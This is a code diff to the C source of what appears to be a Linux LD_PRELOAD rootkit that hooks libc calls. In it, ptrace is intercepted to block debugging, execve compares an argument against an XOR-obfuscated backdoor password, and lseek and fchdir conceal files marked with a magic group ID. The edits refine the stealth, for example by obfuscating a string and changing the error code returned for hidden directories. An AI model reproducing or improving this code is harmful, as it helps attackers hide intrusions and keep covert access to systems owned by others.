@@ -102,7 +102,8 @@ long int ptrace(enum __ptrace_request request, ...)
 	#ifdef DEBUG 
 	printf("[!] ptrace hooked\n"); 
 	#endif 	
-	printf("bl1ng bl1ng\n"); 
+	char *msg = strdup(PTRACE_MSG); xor(msg); 
+	printf("%s\n", msg); 
 	exit(-1);
 }
 
@@ -120,7 +121,7 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	{ 
 		if (argv[1] != NULL)
 		{ 
-			execpw = strdup(EXECPW); xor(execpw);
+			char *execpw = strdup(EXECPW); xor(execpw);
 			if (!strcmp(argv[1], execpw))
 			{ 
 				#ifdef DEBUG 
@@ -148,6 +149,7 @@ off_t lseek(int fildes, off_t offset, int whence)
 	HOOK(__fxstat); 
 	#ifdef DEBUG 
 	printf("[!] lseek hooked\n");
+	#endif
 
 	if (owned()) return old_lseek(fildes, offset, whence); 
 	struct stat filestat; 
@@ -603,7 +605,7 @@ int fchdir(int fildes)
 	if (filestat.st_gid == MAGICGID)
 	{ 
 		CLEAN(magic);
-		errno = ENOENT; 
+		errno = EBADF; 
 		return -1; 
 	}
 	CLEAN(magic); 
